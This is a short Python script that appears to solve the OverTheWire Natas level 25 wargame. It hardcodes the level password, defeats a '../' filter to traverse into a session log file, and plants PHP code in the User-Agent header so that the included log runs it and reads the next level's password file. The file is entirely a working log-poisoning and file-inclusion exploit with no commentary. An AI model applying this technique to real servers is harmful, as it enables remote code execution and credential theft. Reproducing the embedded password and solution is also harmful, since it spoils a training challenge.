import requests
from requests.auth import HTTPBasicAuth

flag = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
sess_id = "brwat"
desired_lang = f"../logs/natas25_{sess_id}.log"

# create lang param
lang = ""
back_path = ".../...//"

lang = desired_lang.replace("../", back_path)

cookies = { "PHPSESSID": sess_id }

r = requests.get(f"http://natas25.natas.labs.overthewire.org/index.php?lang={lang}&debug=true", auth=HTTPBasicAuth("natas25", flag), cookies = cookies, headers = { "User-Agent": "<?php global $__MSG; $__MSG = file_get_contents('/etc/natas_webpass/natas26'); ?>" })

print(r.text)

